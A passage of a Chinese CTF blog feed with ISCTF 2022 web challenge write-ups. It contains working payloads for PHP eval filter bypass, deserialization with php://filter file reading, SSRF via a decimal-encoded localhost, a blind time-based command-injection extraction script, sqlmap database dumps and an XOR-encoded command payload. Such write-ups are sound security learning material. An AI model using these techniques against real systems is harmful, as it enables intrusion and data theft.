class="line"></span><br></pre></td></tr></table></figure><p>看到一个<code>eval()</code>可以执行代码，进入这里首要要满足，num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后依然等于36。</p><p>脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果: </p><blockquote><p>%0C %2B - . 0 1 2 3 4 5 6 7 8 9</p></blockquote><p>%0c其实就是+号的url编码</p><p>Payload:<code>?str=\\\\\\\\/Ilikeisctf&amp;num=%0c36&amp;cmd=system(&#39;tac /f*&#39;);</code></p><hr><h1 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h1><p>先看题目描述</p><blockquote><p>有个dog想想怎么躲避它</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到unserialize就明白这道题考php反序列化。</p><p>考点：</p><blockquote><p>“__toString()”是php中的一个魔术方法，在把对象转换成字符串时自动调用，用于&gt;一个类被当成字符串时应怎样回应；该方法必须返回一个字符串，否则将发出一条“E_RECOVERABLE_ERROR”级别的致命错误。</p></blockquote><p>意思是当一个对象被当成字符串输出时，php会自动调用该对象的__toString()方法。<br>die()与echo的作用类似，会输出字符串。</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></figure><p>解释一下<code>$this-&gt;b = &amp;$this-&gt;a;</code>中&amp;是取地址符号，意思是b将指向a的地址空间，这时a和b都是指向同一个地址空间，给b赋值就相当于给a赋值。<br><img src="https://img-blog.csdnimg.cn/b34e94c04ad849349ceffff71185d0c3.png" alt="在这里插入图片描述"></p><p>另外，在include中可以使用伪协议。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流</td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称</td></tr><tr><td>convert.base64-encode</td><td>等同于base64_encode()</td></tr></tbody></table><p>读取文件源码（针对php文件需要base64编码）</p><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code></p><hr><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>题目描述</p><blockquote><p>都告诉你curl了，剩下的就别问了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/224ff470a121463f9080337fd3cb60db.png" alt="在这里插入图片描述"><br>这里有个this可以点击，然后提示让我们从本地访问</p><p><img src="https://img-blog.csdnimg.cn/2cc837ecd1a7414f94cb1e1bde58492b.png" alt="在这里插入图片描述"></p><p>返回去查看源代码，在注释里有一段代码。<br><img src="https://img-blog.csdnimg.cn/a6d49b2f53a540438155fcd048880b4d.png" alt="在这里插入图片描述"><br>意思是让我们传一个url地址，<code>curl_get($urls)</code>作用应该跟curl差不多。</p><p>先尝试<code>?urls=http://127.0.0.1/flag.php</code>发现被过滤了，localhost也不行。<br><img src="https://img-blog.csdnimg.cn/c9215f452f2a4a75ac0c375e0369a04b.png" alt="在这里插入图片描述"><br>尝试把127.0.0.1转化为其他进制</p><blockquote><ul><li>2130706433  10进制 <a href="http://127.0.0.1/">http://2130706433</a>  </li><li>017700000001 8进制 <a href="http://127.0.0.1/">http://017700000001</a> </li><li>7F000001 16进制   <a href="http://127.0.0.1/">http://0x7F000001</a></li></ul></blockquote><p>尝试10进制可以,<code>?urls=http://2130706433/flag.php</code><br><img src="https://img-blog.csdnimg.cn/84bf2c22ae93479d93e8e33028d24ba1.png" alt="在这里插入图片描述"></p><hr><h1 id="easy-onlineshell"><a href="#easy-onlineshell" class="headerlink" title="easy-onlineshell"></a>easy-onlineshell</h1><p>题目</p><blockquote><p>没有回显的shell</p></blockquote><p><img src="https://img-blog.csdnimg.cn/02c2f16a82ab4867b51f12277b9ba891.png" alt="在这里插入图片描述"></p><p>进入&#x2F;rce</p><p><img src="https://img-blog.csdnimg.cn/05f801794764484ea9c819e9f4ddd7c7.png" alt="在这里插入图片描述"><br>为什么不寻找备份呢？尝试<a href="http://www.zip,得到源码./">www.zip，得到源码。</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/www.zip&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_SourceCode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.run([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析代码发现是命令执行，命令act可控，要注意第一位和最后一位。</p><p>题目提示没有回显，尝试反弹shell、dnslog都失败，感觉这题无回显不出网，唯一成功的命令就是sleep。</p><p>那就只能先把读到的flag写入一个文件里，然后猜字符猜对了就sleep。用python写个脚本跑一下。</p><p>注意：先执行下面这个命令，先写文件，再读文件。</p><p>这个脚本两道题通杀。</p><blockquote><p>act&#x3D;1echo `tac f* &gt;1.txt`1</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dics = <span class="string">&quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span></span><br><span class="line"><span class="keyword">for</span> num1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;</span>+<span class="string">&#x27;a:&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(num1)+<span class="string">&#x27;1&#125;&quot; == &#x27;</span>+<span class="string">&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;</span>.<span class="built_in">format</span>(st)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(num1)</span><br><span class="line">            strs=strs+st</span><br><span class="line">            <span class="built_in">print</span>(strs)</span><br><span class="line"><span class="built_in">print</span>(strs)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/e8290e9b79e642cf99c956a54b45f790.png" alt="在这里插入图片描述"></p><hr><h1 id="傻注"><a href="#傻注" class="headerlink" title="傻注"></a>傻注</h1><p>题目描述</p><blockquote><p>注一下</p></blockquote><p><img src="https://img-blog.csdnimg.cn/c7795ab9093d42d29ad391f9e1950489.png" alt="在这里插入图片描述"><br>找一下登录界面login.php<br><img src="https://img-blog.csdnimg.cn/04c21f4583e14b4f9069deccc6f4d4d8.png" alt="在这里插入图片描述"></p><p>根据题目猜测，这是一道sql注入的题目</p><p>burp suit简单扫一下，发现存在ua注入，到这里思路基本清晰了，直接sqlmap一把梭<br><img src="https://img-blog.csdnimg.cn/c667a7a22e4644b0b74e2daed2376936.png" alt="在这里插入图片描述"><br>查看数据库<br><code>sqlmap -u http://120.79.18.34:20387/login.php  --level 3 --dbs</code><br><img src="https://img-blog.csdnimg.cn/4b8a9a503af6421ab11c8905eda0dff1.png" alt="在这里插入图片描述"><br>查看表<br><code>sqlmap -u http://120.79.18.34:20387/login.php  --level 3 -D ctf --tables</code><br><img src="https://img-blog.csdnimg.cn/c7ec92e83c96491aab2452445047b15f.png" alt="在这里插入图片描述"></p><p>查看user_agents内容</p><p><code>sqlmap -u http://120.79.18.34:20387/login.php  --level 3 -D ctf -T user_agents --columns --dump</code><br><img src="https://img-blog.csdnimg.cn/b5c59d4a63654969a7bb6f5c0320d79a.png" alt="在这里插入图片描述"><br>得到flag</p><hr><h1 id="rce"><a href="#rce" class="headerlink" title="rce?"></a>rce?</h1><p>先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="keyword">eval</span>(<span class="variable">$code</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你能拿到flag吗？&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>无字母数字命令执行可以尝试用异或</p><p>脚本:</p><p>先使用php脚本异或出可用的字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>再用yu22x师傅的python脚本生成命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/87aad4abdc9c48eaa2de21609ab18d05.png" alt="在这里插入图片描述"><br>Payload:<br><code>?shell=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);</code><br><img src="https://img-blog.csdnimg.cn/0ba5b48c0f3d48a6913551f474f489a1.png" alt="在这里插入图片描述"><br>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;感谢老六师傅和gsf1yy师傅的帮助和指导&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/3e72ba15f122485f862caadb544d8c99.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCTF补充</title>
    <link href="https://ctfsun.github.io/2022/11/05/ISCTF2022%E8%A1%A5%E5%85%85/"/>
    <id>https://ctfsun.github.io/2022/11/05/ISCTF2022%E8%A1%A5%E5%85%85/</id>
    <published>2022-11-04T17:28:00.000Z</published>
    <updated>2022-11-10T12:42:46.964Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCTF补充"><a href="#ISCTF补充" class="headerlink" title="ISCTF补充"></a>ISCTF补充</h1><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p><img src="https://img-blog.csdnimg.cn/51608bfcdada4aa1a1c138f43afc1001.jpeg" alt="请添加图片描述"></p><p>用dirsearch工具扫描目录发现<a href="http://www.rar/">www.rar</a></p><p><img src="https://img-blog.csdnimg.cn/9733ef8bace34d2d9e45920f1364f534.png" alt="在这里插入图片描述"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span 